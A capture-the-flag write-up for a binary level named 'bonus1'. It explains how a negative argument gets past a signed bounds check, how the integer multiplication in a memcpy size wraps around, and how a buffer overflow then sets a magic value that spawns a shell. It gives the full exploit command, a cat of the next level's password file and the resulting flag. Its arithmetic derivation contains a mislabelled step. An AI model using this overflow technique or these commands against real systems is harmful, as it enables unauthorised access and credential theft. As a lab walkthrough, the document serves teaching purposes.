# bonus1

The executable does the following :

- Sets `n = atoi(argv[1]`
- Verifies that `n < 10`
- Copies `n * 4` characters of `argv[2]` into a 40-byte buffer with `memcpy`
- If `n == 0x574f4c46`, executes `/bin/sh`

The buffer and `n` are consecutive, so we could easily set `n` by overflowing with the `memcpy`.

The issue is, since the buffer is 40 chars long, we'd need at least 44 bytes to overwrite `n`, but we'd be locked off by the `n < 10`. How can we bypass it ?

## **The trick**

We can use negative numbers to pass the check, and then take advantage of int overflows in `n * 4` !

For our `memcpy`, we'd like `n * 4 == 44`.

We can use the following logic : if you add `UNSIGNED_INT_MAX+1` to our number, it'll stay unchanged. So we have :

```
    n * 4 = 44
<=> n * 4 + UNSIGNED_INT_MAX+1 = 44
<=> n * 4 = - UNSIGNED_INT_MAX+1 + 44
<=> n * 4 = -4294967296 + 44
<=> n * 4 = -4294967252
<=> n * 4 = -1073741813
```

In C, `-1073741813 * 4` equals `44`.

## **The command**

Now we just need to set `argv[2]` to overflow into `n` ; we'll write 40 bytes of garbage followed by the value asked by the program, `0x574f4c46`.

We run :

```
./bonus1 -1073741813 $(python -c 'print("A" * 40 + "\x46\x4c\x4f\x57")')
```


## **The flag**

It works ! In the interactive shell, we run :

```
cat /home/user/bonus2/.pass
```

We get the flag for `bonus1` :

```
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```